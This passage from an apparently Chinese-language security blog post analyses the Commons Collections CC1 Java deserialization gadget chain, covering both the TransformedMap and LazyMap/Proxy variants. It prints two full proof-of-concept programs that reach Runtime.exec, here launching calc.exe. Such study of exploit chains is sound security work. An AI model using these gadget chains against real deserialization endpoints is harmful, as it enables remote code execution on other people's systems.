class="comment">//这个方法返回var2.memberTypes,我们的memberTypes是一个hashmap,而且key为&quot;value&quot;</span></span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();<span class="comment">//memberValues为我们传入的map</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next();     <span class="comment">//遍历map</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();<span class="comment">//获取map的key,这里我们传入一个值为value的key,令var6=&quot;value&quot;</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);<span class="comment">//在var3中找key为var6的值,如果在这里没有找到,则返回了null,所以我们需要找一个Annotation类型有方法名为我们map的key</span></span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先，为什么我们一定要传入一个Annotation类：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230423224159202.png" alt="image-20230423224159202"></p><p>是因为这里，调用的是AnnotationType的<code>getInstance()</code>方法，而this.type就是我们传入的Annotation类。</p><p>首先跟入getInstance()</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230421213649805.png" alt="image-20230421213649805"></p><p>定义了一个var1，调用函数，用于获取访问权限。</p><p>定义了一个AnnotationType类型的var2，这里调用了getAnnotationType()函数，获取了我们传入的Annotation类的注解。</p><p>然后只要存在注解，就能够进入if。</p><p>此时，将var2重新赋值为一个AnnotationType类型，这里跟进构造函数：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230421222053697.png" alt="image-20230421222053697"></p><p>因为此时我们传入的var0是Annotation类，所以直接执行else。</p><p>在else中，返回了var1，也就是我们定义的<code>Annotation</code>中的所有方法。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230421223105132.png" alt="image-20230421223105132"></p><p>然后创建了三个HashMap对象，设置了初始容量和负载因子。</p><p>然后定义了一个var3的数组，获取var2中的所有Methods,var4是方法的数量。</p><p>进入了一个for循环，依次遍历var2中的所有方法。</p><p>如果当前遍历到的方法有参数，就报错。</p><p>随后，定义了一个var7，用于存储方法名。</p><p>然后var8存储返回类型。</p><p>然后将var7作为键，调用了一个函数处理var8，函数定义在下面：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230423170304159.png" alt="image-20230423170304159"></p><p>函数用于将var8存放的类型，转换为类型对应的类。这里作为值传入。</p><p><strong>注意</strong>：</p><p>这个地方<code>memberTypes</code>这个变量是非常重要的，在我们的<code>AnnotationInvocationHandler.class</code>中可以看到，var3其实就是var2调用了一个<code>memberTypes()</code>方法的返回值。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230423215002973.png" alt="image-20230423215002973"></p><p>而这里的函数的返回值其实也就是我们创建的memberTypes这个变量。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230423215044365.png" alt="image-20230423215044365"></p><p><strong>因此，需要重视这个变量。</strong></p><p><code>var7</code>是我们传入<code>AnnotationInvocationHandler</code>类构造方法的<code>Annotation</code>类中所有方法的方法名（因为是遍历）</p><p>也就是说<code>memberTypes</code>这个HashMap类中的键值对中，键是所有方法的方法名，而值是方法对应的返回值的类型。</p><p>因此：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230423221309915.png" alt="image-20230423221309915"></p><p><code>var3</code>是上述的<code>memberTypes</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230423221626479.png" alt="image-20230423221626479"></p><p>在这部分，var4是一个用于遍历集合的类，上述将memberValues的内部键值对作为一个视图返回，然后存储在var4中。</p><p>只要var4中还有可以遍历的元素，就执行while循环。</p><p><code>var5</code>是一个存放键值对的类，用于表示<code>var4</code>中的元素</p><p><code>var6</code>存放这个<code>var5</code>这个键值对中的键，而<code>var7</code>则是存放<code>var3</code>中，键对应的值。</p><p>而<code>memberValue</code>是我们传入的，经过<code>Transformer</code>修饰的Map类。</p><p>也就是说，在我们创建的Map中，存在的键在var3中有对应的值，也就是说，在Map中的键，必须是Annotation这个类中的某个方法名。</p><p>到这里，我们就已经知道为什么需要满足那两个条件了。</p><h3 id="使用Retention"><a href="#使用Retention" class="headerlink" title="使用Retention:"></a>使用Retention:</h3><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230423224721942.png" alt="image-20230423224721942"></p><p>这里可以看到，<code>Retention.class</code>是Annotation的子类，这里是满足我们的使用要求的。</p><p>其中，存在一个方法，叫做<code>value()</code>，按照我们的要求，我们需要在被<code>Transformer</code>修饰的<code>Map</code>中传入一个键，名字叫value。</p><p>所以可以使用：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">innermap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxx&quot;</span>);</span><br></pre></td></tr></table></figure><p>就可以进入if，完成setValue，进而触发我们的Payload，完成命令执行。</p><p><strong>当然，这里只要是<code>Annotation</code>的子类就可以</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230423225239465.png" alt="image-20230423225239465"></p><p>这两个其实也行。</p><p>也就是说，我们对innerMap()的修改，其实是可以有多种的。</p><p>主要是根据使用的子类中的方法名来决定的。</p><h3 id="原版POC："><a href="#原版POC：" class="headerlink" title="原版POC："></a>原版POC：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;C:\\Windows\\WinSxS\\wow64_microsoft-windows-calc_31bf3856ad364e35_10.0.19041.1_none_6a03b910ee7a4073\\calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chaintransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap,<span class="literal">null</span>,chaintransformer);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance(Retention.class,outerMap);</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC1.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(file);</span><br><span class="line">            output.writeObject(instance);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException error)&#123;</span><br><span class="line">            error.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC1.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(file);</span><br><span class="line">            input.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Method m = Runtime.class.getMethod(&quot;getRuntime&quot;);</span></span><br><span class="line"><span class="comment"> Runtime r = (Runtime)m.invoke(null); //这里的getRuntime是static的方法，所以可以不写实例化对象。</span></span><br><span class="line"><span class="comment"> r.exec(&quot;需要的路径&quot;);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230501190153382.png" alt="image-20230501190153382"></p><h3 id="为什么Java高版本不能使用："><a href="#为什么Java高版本不能使用：" class="headerlink" title="为什么Java高版本不能使用："></a>为什么Java高版本不能使用：</h3><p>当我们创建了POC之后，会发现，只能在8u17版本中进行利用。</p><p>这是因为在高版本中，对<code>AnnotationInvocationHandler.class</code>这个类的<code>readObject()</code>方法进行了修改：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@java</span>.io.Serial</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; t = (Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt;)fields.get(<span class="string">&quot;type&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(<span class="string">&quot;memberValues&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(t);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">        <span class="comment">// consistent with runtime Map type</span></span><br><span class="line">        Map&lt;String, Object&gt; mv = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">//注意这一行，这里创建了一个LinkedHashMap用于存储我们传入的Map中的键值对。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                value = memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    value = <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                                Objects.toIdentityString(value))</span><br><span class="line">                        .setMember(annotationType.members().get(name));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            mv.put(name, value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        UnsafeAccessor.setType(<span class="built_in">this</span>, t);</span><br><span class="line">        UnsafeAccessor.setMemberValues(<span class="built_in">this</span>, mv);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这是因为在类代码的656行，新建了一个类对象，<code>LinkedHashMap</code>的对象mv，然后在673行可以看到将我们传入的Map的键和值传入了mv中。</p><p>因为我们是不能控制mv这个对象的，所以不能进行RCE操作。</p><p>这里就要看到在ysoserial中的代码，里面使用的不是TransformedMap，而是改用了<code>LazyMap</code>这个类。</p><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap:"></a>LazyMap:</h3><p>什么是<code>LazyMap</code>？<br><code>LazyMap</code>和<code>TransformedMap</code>类似，都是来自于Common-Collections库，并继承了<code>AbstractMapDecorator</code>。</p><p>这两个利用链的主要区别是，TransformedMap是在写入元素的时候执行的transform，而LazyMap是在它的get方法中执行的<code>factory.transform</code>。</p><p>这个函数的作用，就像是LazyMap的描述一样，是<strong>懒加载</strong>，也就是在get找不到值的时候，它会调用factory.transform方法去获取一个值。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line"><span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line"><span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">map.put(key, value);</span><br><span class="line"><span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述是源码，这里可以看到，在这个函数中，当我们尝试从一个map类型的参数中获取它的键的时候，如果找不到键，就调用<code>factory.transform(key)</code></p><p>但是相比于<code>TransformedMap</code>的利用方法，LazyMap的利用更加复杂。</p><blockquote><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code>的readObject()没有直接调用到Map中的get方法</p></blockquote><p>也就是说，如果我们想要调用其中的get()方法，就必须要使用别的方式来进行。</p><p>ysoserial中可以给出一个新的路线，在<code>AnnotationInvocationHandler</code>类的invoke方法中有调用到<code>get()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">        Class[] var5 = var2.getParameterTypes();</span><br><span class="line">        <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var5.length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span> (var4) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.toStringImpl();</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.hashCodeImpl();</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.type;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);<span class="comment">//这里调用了memberValues中的get方法</span></span><br><span class="line">                    <span class="keyword">if</span> (var6 == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(<span class="built_in">this</span>.type, var4);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                            var6 = <span class="built_in">this</span>.cloneArray(var6);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> var6;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里还是jdk1.8里面的<code>AnnotationInvocationHandler</code>类。</p><p>为了调用这个地方的invoke()方法，这里需要使用Java中的对象代理，也就是类似于实现PHP中的魔术方法来进行对对象的调用。</p><p>这里回头看一下<code>AnnotationInvocationHandler</code>类，可以发现这里其实就是一个继承了InvocationHandler接口的类。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230505151045595.png" alt="image-20230505151045595"></p><p>也就是说，这个类实际上我们是可以进行代理的。</p><p>只要我们将这个类进行代理，那么在进行readObject的时候，不管是调用这个类的什么方法，都会通过代理类，然后受到代理类<code>Invoke()</code>方法的调控，进而触发<code>LazyMap#get</code>。</p><p>因为我们需要调用<code>AnnotationInvocationHandler</code>中的Invoke()方法从而进入<code>LazyMap</code>。</p><h3 id="调用思路："><a href="#调用思路：" class="headerlink" title="调用思路："></a>调用思路：</h3><p>因此我们不难得出此处POC需要的几个要素：</p><blockquote><ol><li>不使用TransformedMap进行修饰，而是换成LazyMap进行修饰</li><li>为了调用<code>AnnotationInvocationHandler</code>中的Invoke()函数，所以需要对这个类进行代理，将这个类作为handler参数给代理类使用。当代理类进行任何方法的调用的时候，都会直接调用<code>AnnotationInvocationHandler</code>中的<code>Invoke()</code>函数，这是由Java中代理的性质决定的。</li><li>对于上述的代理类，因为我们反序列化的入口还是AnnotationInvocationHandler，所以需要将上述的代理类包装一次，变为AnnotationInvocationHandler类，来进行序列化。</li></ol></blockquote><h3 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;C:\\Windows\\WinSxS\\wow64_microsoft-windows-calc_31bf3856ad364e35_10.0.19041.1_none_6a03b910ee7a4073\\calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chaintransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chaintransformer);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)constructor.newInstance(Retention.class,outerMap);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance(Retention.class,proxyMap);</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC1.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(file);</span><br><span class="line">            output.writeObject(instance);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException error)&#123;</span><br><span class="line">            error.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span 